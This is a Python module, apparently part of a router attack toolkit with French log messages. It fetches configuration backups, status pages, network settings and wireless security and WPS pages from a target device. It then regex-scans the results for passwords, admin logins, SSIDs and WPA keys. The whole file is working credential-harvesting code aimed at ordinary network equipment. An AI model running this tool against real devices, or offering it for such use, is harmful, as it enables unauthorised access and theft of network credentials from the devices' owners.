import requests
import base64
from utils.helpers import info, success, warning, error
from colorama import Fore, Style


class ConfigExtractor:
    def __init__(self, target=None, username=None, password=None):
        self.target = target
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
        self.timeout = 5.0

    def set_target(self, target, username=None, password=None):
        self.target = target
        if username:
            self.username = username
        if password:
            self.password = password
        return self

    def _auth_headers(self):
        if self.username and self.password:
            auth = base64.b64encode(f"{self.username}:{self.password}".encode()).decode()
            return {"Authorization": f"Basic {auth}"}
        return {}

    def _request(self, path, method="GET", **kwargs):
        scheme = self.target.get("scheme", "http")
        ip = self.target["ip"]
        port = self.target["port"]
        url = f"{scheme}://{ip}:{port}{path}"

        headers = self._auth_headers()
        if "headers" in kwargs:
            headers.update(kwargs["headers"])
        kwargs["headers"] = headers

        try:
            return self.session.request(method, url, timeout=self.timeout, verify=False, **kwargs)
        except requests.RequestException:
            return None

    def extract_all(self):
        if not self.target:
            error("Aucune cible définie")
            return {}

        info(f"Extraction de configuration depuis {self.target['ip']}:{self.target['port']}")
        config = {}

        configs = self._extract_config_files()
        if configs:
            config["config_files"] = configs

        info_router = self._extract_system_info()
        if info_router:
            config["system_info"] = info_router

        network = self._extract_network_config()
        if network:
            config["network"] = network

        wireless = self._extract_wireless_config()
        if wireless:
            config["wireless"] = wireless

        return config

    def _extract_config_files(self):
        configs = {}
        paths = {
            "config.bin": "/config.bin",
            "backup.bin": "/backup.bin",
            "config.xml": "/config.xml",
            "backup.xml": "/backup.xml",
            "romfile.cfg": "/romfile.cfg",
            "system.xml": "/system.xml",
        }

        for name, path in paths.items():
            resp = self._request(path)
            if resp and resp.status_code == 200 and len(resp.content) > 100:
                configs[name] = {
                    "size": len(resp.content),
                    "content_type": resp.headers.get("Content-Type", ""),
                    "data_preview": resp.content[:200].hex() if len(resp.content) > 0 else ""
                }
                success(f"  Fichier récupéré: {name} ({len(resp.content)} octets)")

        return configs

    def _extract_system_info(self):
        info_sys = {}
        endpoints = {
            "status": ["/status.html", "/Status.htm", "/cgi-bin/status"],
            "device_info": ["/deviceinfo.html", "/deviceInfo.htm"],
            "system": ["/system.html", "/sysInfo.htm"],
        }

        for category, paths in endpoints.items():
            for path in paths:
                resp = self._request(path)
                if resp and resp.status_code == 200:
                    info_sys[category] = resp.text[:500]

        return info_sys

    def _extract_network_config(self):
        network = {}
        endpoints = {
            "wan": ["/wan.html", "/Wan.htm", "/cgi-bin/wan"],
            "lan": ["/lan.html", "/Lan.htm", "/cgi-bin/lan"],
            "dhcp": ["/dhcp.html", "/Dhcp.htm", "/cgi-bin/dhcp"],
        }

        for category, paths in endpoints.items():
            for path in paths:
                resp = self._request(path)
                if resp and resp.status_code == 200:
                    network[category] = resp.text[:500]
                    break

        return network

    def _extract_wireless_config(self):
        wireless = {}
        endpoints = {
            "basic": ["/wireless.html", "/wlan.html", "/cgi-bin/wireless"],
            "security": ["/wlsecurity.html", "/WlanSecurity.htm"],
            "wps": ["/wps.html", "/Wps.htm"],
        }

        for category, paths in endpoints.items():
            for path in paths:
                resp = self._request(path)
                if resp and resp.status_code == 200:
                    wireless[category] = resp.text[:500]
                    break

        return wireless

    def extract_credentials(self, config_data=None):
        import re
        creds = []

        if config_data:
            text = str(config_data)
            patterns = [
                r'password[\s"\'=:]+([^"\'<>\s&]+)',
                r'pass[\s"\'=:]+([^"\'<>\s&]+)',
                r'pwd[\s"\'=:]+([^"\'<>\s&]+)',
                r'user[\s"\'=:]+([^"\'<>\s&]+)',
                r'username[\s"\'=:]+([^"\'<>\s&]+)',
                r'login[\s"\'=:]+([^"\'<>\s&]+)',
                r'admin[\s"\'=:]+([^"\'<>\s&]+)',
                r'SSID[\s"\'=:]+([^"\'<>\s&]+)',
                r'Key[\s"\'=:]+([^"\'<>\s&]+)',
                r'WPA[\s"\'=:]+([^"\'<>\s&]+)',
            ]
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for m in matches:
                    if m and len(m) > 2:
                        creds.append(m)

        return list(set(creds))
